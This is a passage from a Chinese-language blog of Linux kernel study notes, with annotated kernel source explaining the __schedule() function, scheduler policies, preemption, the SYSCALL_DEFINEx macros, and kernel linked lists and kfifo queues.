<li>schedule() 函数只是个外层的封装，实际调用的还是 __schedule() 函数 </li>
<li>__schedule() 接受一个参数，该参数为 bool 型，false 表示非抢占，自愿调度，而 true 则相反</li>
<li>__schedule() 的实现大概可以分为四个部分：<ul>
<li>针对当前进程的处理</li>
<li>选择下一个需要执行的进程</li>
<li>执行切换工作</li>
<li>收尾工作</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __sched notrace __schedule(<span class="keyword">bool</span> preempt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *switch_count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rq_flags</span> <span class="title">rf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> cpu;</span><br><span class="line"></span><br><span class="line">	cpu = smp_processor_id();</span><br><span class="line">	rq = cpu_rq(cpu);</span><br><span class="line">	prev = rq-&gt;curr;</span><br><span class="line"></span><br><span class="line">	schedule_debug(prev);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sched_feat(HRTICK))</span><br><span class="line">		hrtick_clear(rq);</span><br><span class="line"></span><br><span class="line">	local_irq_disable(); <span class="comment">/* 禁止本地中断，防止与中断的竞争行为 */</span></span><br><span class="line">	rcu_note_context_switch(preempt);</span><br><span class="line"></span><br><span class="line">	rq_lock(rq, &amp;rf);</span><br><span class="line">	smp_mb__after_spinlock();</span><br><span class="line"></span><br><span class="line">	rq-&gt;clock_update_flags &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	update_rq_clock(rq); <span class="comment">/* 更新本地runqueue的clock和clock_task变量，这两个变量代表runqueue的时间 */</span></span><br><span class="line"></span><br><span class="line">	switch_count = &amp;prev-&gt;nivcsw;</span><br><span class="line">	<span class="keyword">if</span> (!preempt &amp;&amp; prev-&gt;state) &#123;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(signal_pending_state(prev-&gt;state, prev))) &#123;</span><br><span class="line">			prev-&gt;state = TASK_RUNNING;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			deactivate_task(rq, prev, DEQUEUE_SLEEP | DEQUEUE_NOCLOCK);</span><br><span class="line">			prev-&gt;on_rq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (prev-&gt;in_iowait) &#123;</span><br><span class="line">				atomic_inc(&amp;rq-&gt;nr_iowait);</span><br><span class="line">				delayacct_blkio_start();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (prev-&gt;flags &amp; PF_WQ_WORKER) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">to_wakeup</span>;</span></span><br><span class="line"></span><br><span class="line">				to_wakeup = wq_worker_sleeping(prev);</span><br><span class="line">				<span class="keyword">if</span> (to_wakeup)</span><br><span class="line">					try_to_wake_up_local(to_wakeup, &amp;rf);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		switch_count = &amp;prev-&gt;nvcsw;</span><br><span class="line">	&#125;</span><br><span class="line">	next = pick_next_task(rq, prev, &amp;rf); <span class="comment">/* 检查并选择调度类 */</span></span><br><span class="line">	clear_tsk_need_resched(prev);</span><br><span class="line">	clear_preempt_need_resched();</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (likely(prev != next)) &#123;</span><br><span class="line">		rq-&gt;nr_switches++;</span><br><span class="line">		rq-&gt;curr = next;</span><br><span class="line">		++*switch_count;</span><br><span class="line">		trace_sched_switch(preempt, prev, next);</span><br><span class="line">		rq = context_switch(rq, prev, next, &amp;rf);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		rq-&gt;clock_update_flags &amp;= ~(RQCF_ACT_SKIP|RQCF_REQ_SKIP);</span><br><span class="line">		rq_unlock_irq(rq, &amp;rf);</span><br><span class="line">	&#125;</span><br><span class="line">	balance_callback(rq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>__schedule() 通常都需要和一个具体的调度类相关联，所以它会找到一个最高优先级的调度类（拥有自己的运行队列）</li>
<li>而 __schedule() 调用的 pick_next_task() 函数就实现了这个过程，它会以优先级为序，依次检查每一个调用类，选择最高优先级的进程</li>
</ul>
<p><strong>调度策略</strong></p>
<p>Linux 的调度器是以模块的方式提供的，这种模块化的结构被称为 <strong>调度器类</strong>，它允许多种不同的可动态添加的调度算法共存</p>
<ul>
<li>每个调度器都有一个优先级，程序会根据优先级遍历调度类，最高优先优先级的调度器类胜出，然后再根据调度器自身的算法去选择下一个将要执行的程序</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>策略</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHED_NORMAL</td>
<td>普通的分时进程，使用的 fair_sched_class 调度类（完全公平调度器）</td>
</tr>
<tr>
<td>SCHED_FIFO</td>
<td>先进先出的实时进程，当调用程序把CPU分配给进程的时候，它把该进程描述符保留在运行队列链表的当前位置，此调度策略的进程一旦使用CPU则一直运行，如果没有其他可运行的更高优先级实时进程，进程就继续使用CPU，想用多久就用多久，即使还有其他具有相同优先级的实时进程处于可运行状态，使用的是 rt_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_RR</td>
<td>时间片轮转的实时进程，当调度程序把CPU分配给进程的时候，它把该进程的描述符放在运行队列链表的末尾，这种策略保证对所有具有相同优先级的 SCHED_RR 实时进程进行公平分配CPU时间，使用的 rt_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_BATCH</td>
<td>是 SCHED_NORMAL 的分化版本，采用分时策略，根据动态优先级，分配CPU资源，在有实时进程的时候，实时进程优先调度，但针对吞吐量优化，除了不能抢占外与常规进程一样，允许任务运行更长时间，更好使用高速缓存，适合于成批处理的工作，使用的 fair_shed_class 调度类</td>
</tr>
<tr>
<td>SCHED_IDLE</td>
<td>优先级最低，在系统空闲时运行，使用的是 idle_sched_class 调度类，给0号进程使用</td>
</tr>
<tr>
<td>SCHED_DEADLINE</td>
<td>新支持的实时进程调度策略，针对突发型计算，并且对延迟和完成时间敏感的任务使用，基于 EDF（earliest deadline first），使用的是 dl_sched_class 调度类</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>SCHED_FIFO：实现了一种简单的先入先出的调度算法，它不使用时间片，处于 SCHED_FIFO 级的进程会比任何 SCHED_NORMAL 级的进程都要优先执行调度</li>
<li>SCHED_RR：SCHED_RR 和 SCHED_FIFO 大体上相同，只是 SCHED_RR 带有时间片，如果一个 SCHED_RR 任务耗尽了它的时间片，在同一优先级的其他实时进程会被轮流调度</li>
<li>PS：SCHED_FIFO 和 SCHED_RR 都是采用静态优先级</li>
</ul>
<p><strong>上下文切换&amp;抢占</strong></p>
<p>上下文切换：一个可执行进程切换到另一个可执行进程的过程（由 <code>context_switch</code> 函数进行处理）</p>
<ul>
<li><code>context_switch</code> 函数完成了两项基本工作：<ul>
<li>调用 <code>switch_mm</code>，把虚拟内存从上一个进程映射切换到新进程中</li>
<li>调用 <code>switch_to</code>，把进程处理器状态从上一个进程切换到新进程中</li>
</ul>
</li>
</ul>
<p>用户抢占：内核从系统调用或中断处理程序即将返回用户空间的时候，如果 <code>need resched</code> 标志被设置，会导致 <code>schedule</code>，此时就会发生用用户抢占</p>
<ul>
<li>用户抢占的发生场景：<ul>
<li>从系统调用返回用户空间</li>
<li>从中断处理程序返回用户空间</li>
</ul>
</li>
</ul>
<p>内核抢占：Linux 支持内核抢占（对于不支持内核抢占的程序，内核代码会一直执行，直到它完成为止），内核会检查 <code>need resched</code> 和 <code>preempt_count</code> 的值</p>
<ul>
<li>内核抢占的发生场景：<ul>
<li>中断处理程序正在执行，且返回内核空间之前</li>
<li>内核代码再一次具有可抢占性</li>
<li>内核中的任务显式地调用 <code>schedule</code> </li>
<li>内核中的任务阻塞（这同样也会调用 <code>schedule</code>）</li>
</ul>
</li>
<li><code>preempt_count</code> 简述：<ul>
<li><code>preempt_count</code> 初始化为“0”，每当使用锁时数值加“1”，释放锁时数值减“1”</li>
<li>当 <code>preempt_count</code> 为“0”时，说明有一个更为重要的任务需要执行并且可以抢占</li>
<li>当 <code>preempt_count</code> 不为“0”时，说明内核不能安全抢占该进程</li>
</ul>
</li>
</ul>
<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>简单来说，系统调用就是用户程序和硬件设备之间的桥梁，用户程序在需要的时候，通过系统调用来使用硬件设备</p>
<p>系统调用的存在，有以下重要的意义：</p>
<ul>
<li>用户程序通过系统调用来使用硬件，而不用关心具体的硬件设备，这样大大简化了用户程序的开发 </li>
<li>系统调用使得用户程序有更好的可移植性</li>
<li>系统调用使得内核能更好的管理用户程序，增强了系统的稳定性 </li>
<li>系统调用有效的分离了用户程序和内核的开发</li>
</ul>
<p>用户程序，系统调用，内核，硬件设备的调用关系如下图： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660827734080-1666871176497.png" class width="1660827734080"> 
<p>要想实现系统调用，主要实现以下几个方面：</p>
<ul>
<li>通知内核调用一个哪个系统调用（系统调用号）</li>
<li>用户程序把系统调用的参数传递给内核（前5个参数放在 [ebx,ecx,edx,esi,edi] 中，如果参数多的话，还需要用个单独的寄存器存放指向所有参数在用户空间地址的指针）</li>
<li>用户程序获取内核返回的系统调用返回值（获取系统调用的返回值也是通过寄存器，在x86系统上，返回值放在 [eax] 中）</li>
</ul>
<p><strong>Linux 系统调用的实现</strong></p>
<p>Linux 采用 <code>SYSCALL_DEFINEx</code> 来定义一个系统调用（“x”代表该系统调用的参数个数）</p>
<ul>
<li>例如：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pipe()系统调用底层 */</span></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>源码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINE_MAXARGS	6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCALL_DEFINEx(x, sname, ...)				\</span></span><br><span class="line"><span class="meta">	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\</span></span><br><span class="line"><span class="meta">	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __SYSCALL_DEFINEx</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __SYSCALL_DEFINEx(x, name, ...)					\</span></span><br><span class="line"><span class="meta">	__diag_push();							\</span></span><br><span class="line"><span class="meta">	__diag_ignore(GCC, 8, <span class="meta-string">&quot;-Wattribute-alias&quot;</span>,			\</span></span><br><span class="line"><span class="meta">		      <span class="meta-string">&quot;Type aliasing is used to sanitize syscall arguments&quot;</span>);\</span></span><br><span class="line"><span class="meta">	asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))	\</span></span><br><span class="line"><span class="meta">		__attribute__((alias(__stringify(__se_sys##name))));	\</span></span><br><span class="line"><span class="meta">	ALLOW_ERROR_INJECTION(sys##name, ERRNO);			\</span></span><br><span class="line"><span class="meta">	static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\</span></span><br><span class="line"><span class="meta">	asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__));	\</span></span><br><span class="line"><span class="meta">	asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__))	\</span></span><br><span class="line"><span class="meta">	&#123;								\</span></span><br><span class="line"><span class="meta">		long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\</span></span><br><span class="line"><span class="meta">		__MAP(x,__SC_TEST,__VA_ARGS__);				\</span></span><br><span class="line"><span class="meta">		__PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__));	\</span></span><br><span class="line"><span class="meta">		return ret;						\</span></span><br><span class="line"><span class="meta">	&#125;								\</span></span><br><span class="line"><span class="meta">	__diag_pop();							\</span></span><br><span class="line"><span class="meta">	static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __SYSCALL_DEFINEx */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>这个宏定义真是天书，给个博客参考一下：<a target="_blank" rel="noopener" href="https://www.e-learn.cn/topic/3281736#:~:text=显然SYSCALL_DEFINE1是系统调用的入口，其中1表示函数参数的个数，name表示系统调用函数的名字，同理下面的2%2C3%2C4%2C5%2C6表示参数个数。 其具体定义位于linux-4.13.16includelinuxsyscalls.h中，具体定义如下：,%23define SYSCALL_DEFINE1(name%2C...">SYSCALL_DEFINEx宏源码解析</a>) </li>
<li>最后还要把新定义的系统调用添加到系统调用表里面</li>
</ul>
<p><strong>系统调用参数传递</strong></p>
<p>x86-32 系统：</p>
<ul>
<li>不超过6个：ebx，ecx，edx，esi，edi，ebp 按照顺序存放前6个参数</li>
<li>超过6个：全部参数应该依次放在一块连续的内存区域里，同时在寄存器 ebx 中保存指向该内存区域的指针</li>
</ul>
<p>x86-64 系统：</p>
<ul>
<li>RDI、RSI、RDX、RCX、R8、R9 这6个寄存器依次对应第1参数到第6个参数</li>
</ul>
<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><p>Linux 中4个基本的内核数据结构：链表，队列，映射，红黑树</p>
<p><strong>链表</strong></p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832270823-1666871176497.png" class width="1660832270823"> 
<ul>
<li>有个单独的头节点（head）</li>
<li>每个节点（node）除了包含必要的数据之外，还有2个指针（pre,next）</li>
<li>pre 指针指向前一个节点（node），next 指针指向后一个节点（node）</li>
<li>头节点（head）的 pre 指针指向链表的最后一个节点</li>
<li>最后一个节点的 next 指针指向头节点（head）</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832773428-1666871176497.png" class width="1660832773428"> 
<ul>
<li>其实就是把数据放在前面了而已</li>
</ul>
<p>单向链表&amp;双向链表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_element</span>&#123;</span></span><br><span class="line">	<span class="keyword">void</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_element</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_element</span> *<span class="title">prev</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>环形链表：</p>
<ul>
<li>环形链表的节点和双向链表相同，但是最后一个元素指向第一个元素</li>
<li>有一个特殊的指针（头指针）始终指向头节点，利用该指针可以快速查找链表的“起始端”</li>
<li>Linux 内核的标准链表就是采用的环形链表</li>
</ul>
<p><strong>Linux 中链表的实现</strong></p>
<p>Linux 不是将数据结构塞入链表，而是将链表节点塞入数据结构</p>
<p>其数据结构很简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>内核中添加链表的操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_tail</span><span class="params">(struct list_head *_new, struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// @new:要添加的新条目</span></span><br><span class="line">    <span class="comment">// @head:目标结点(将new添加到它之前)</span></span><br><span class="line">	__list_add(_new, head-&gt;prev, head); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add(struct list_head *_new, struct list_head *prev,</span><br><span class="line">			      struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	next-&gt;prev = _new;</span><br><span class="line">	_new-&gt;next = next;</span><br><span class="line">	_new-&gt;prev = prev;</span><br><span class="line">	prev-&gt;next = _new;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>因为 <code>list_add_tail</code> 只接收 <code>list_head</code> 为参数，链表也只能查找到 <code>list_head</code> 的地址</li>
<li>所以需要一个宏定义来通过 <code>list_head</code> 快速定位父类型结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> container_of(ptr, type, member)                                        \</span></span><br><span class="line"><span class="meta">	(&#123;                                                                     \</span></span><br><span class="line"><span class="meta">		const typeof(((type *)0)-&gt;member) *__mptr = (ptr);             \</span></span><br><span class="line"><span class="meta">		(type *)((char *)__mptr - offsetof(type, member));             \</span></span><br><span class="line"><span class="meta">	&#125;)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>container_of</code> 宏，我们可以定义一个简单的宏函数来返回包含 <code>list_head</code> 的父类型结构体的起始地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_entry(ptr, type, member) container_of(ptr, type, member)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp; ((TYPE *)0)-&gt;MEMBER)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>依靠 <code>list_entry</code> ，内核提供了创建，操作以及其他链表管理的各种例程（所有这些方法都不需要考虑 <code>list_head</code> 在父类型结构体中的位置）</li>
<li>通过 <code>offsetof</code> ，内核可以快速查看某个结构条目在该父类型结构体中的偏移</li>
<li>PS：对于 <code>container_of</code> 的计算过程可以参考一下这篇博客 =&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/s2603898260/article/details/79371024">container of()函数简介</a> </li>
</ul>
<p>Linux 中对链表的其他操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_tail</span><span class="params">(struct list_head *_new, struct list_head *head)</span> <span class="comment">/* 插链(将new添加到head之前) */</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span> <span class="comment">/* 脱链(直接把entry脱链) */</span></span></span><br></pre></td></tr></table></figure>
<p><strong>队列</strong></p>
<p>内核中的队列是以字节形式保存数据的，所以获取数据的时候，需要知道数据的大小，如果从队列中取得数据时指定的大小不对的话，取得数据会不完整或过大</p>
<ul>
<li>队列是限制在两端进行插入操作和删除操作的线性表，允许进行存入操作的一端称为“队尾”，允许进行删除操作的一端称为“队头”</li>
<li>当线性表中没有元素时，称为“空队”</li>
<li>特点：先进先出（FIFO）</li>
</ul>
<p>常规的队列有如下两种：</p>
<ul>
<li>顺序队列：建立顺序队列结构必须为其静态分配或动态申请一片连续的存储空间，并设置两个指针进行管理<ul>
<li>队头指针 front，它指向队头元素</li>
<li>队尾指针 rear，它指向下一个入队元素的存储位置 </li>
</ul>
</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834074319-1666871176497.png" class width="1660834074319"> 
<ul>
<li>链式队列：一个链队列显然需要两个分别指示队头和队尾的指针（分别成为头指针和尾指针）才能唯一确定<ul>
<li>空的链队列的判决条件为头指针和尾指针均指向头节点</li>
</ul>
</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834323260-1666871176497.png" class width="1660834323260"> 
<p><strong>Linux 中队列的实现</strong></p>
<p>Linux 中的通用队列被称为 kfifo，提供了两个主要操作：enqueue（入队列）和 dequeue（出队列）</p>
<p>用于管理 kfifo 的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">kfifo</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	in; <span class="comment">/* 队列入口(写位置的“逻辑偏移量”) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	out; <span class="comment">/* 队列出口(读位置的“逻辑偏移量”) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	mask; <span class="comment">/* 为了后续优化 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	esize; <span class="comment">/* 队列中每个元素所占用的字节数 */</span></span><br><span class="line">	<span class="keyword">void</span>		*data; <span class="comment">/* 指向数据的指针 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>创建队列 <code>kfifo_alloc</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfifo_alloc(fifo, size, gfp_mask) \</span></span><br><span class="line"><span class="meta">__kfifo_int_must_check_helper( \</span></span><br><span class="line"><span class="meta">(&#123; \</span></span><br><span class="line"><span class="meta">	typeof((fifo) + 1) __tmp = (fifo); \</span></span><br><span class="line"><span class="meta">	struct __kfifo *__kfifo = &amp;__tmp-&gt;kfifo; \</span></span><br><span class="line"><span class="meta">	__is_kfifo_ptr(__tmp) ? \</span></span><br><span class="line"><span class="meta">	__kfifo_alloc(__kfifo, size, sizeof(*__tmp-&gt;type), gfp_mask) : \</span></span><br><span class="line"><span class="meta">	-EINVAL; \</span></span><br><span class="line"><span class="meta">&#125;) \</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>该函数创建并初始化一个大小为 size 的 kfifo（内核使用 gfp_mask 来标识分配队列）</li>
<li>该函数的核心还是调用 <code>__kfifo_alloc</code>，在其中会自动分配 buffer</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __kfifo_alloc(struct __kfifo *fifo, <span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span><br><span class="line">		<span class="keyword">size_t</span> esize, <span class="keyword">gfp_t</span> gfp_mask)</span><br><span class="line">&#123;</span><br><span class="line">	size = roundup_pow_of_two(size);</span><br><span class="line">	fifo-&gt;in = <span class="number">0</span>;</span><br><span class="line">	fifo-&gt;out = <span class="number">0</span>;</span><br><span class="line">	fifo-&gt;esize = esize;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (size &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		fifo-&gt;data = <span class="literal">NULL</span>;</span><br><span class="line">		fifo-&gt;mask = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">	fifo-&gt;data = kmalloc_array(esize, size, gfp_mask);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!fifo-&gt;data) &#123;</span><br><span class="line">		fifo-&gt;mask = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	fifo-&gt;mask = size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 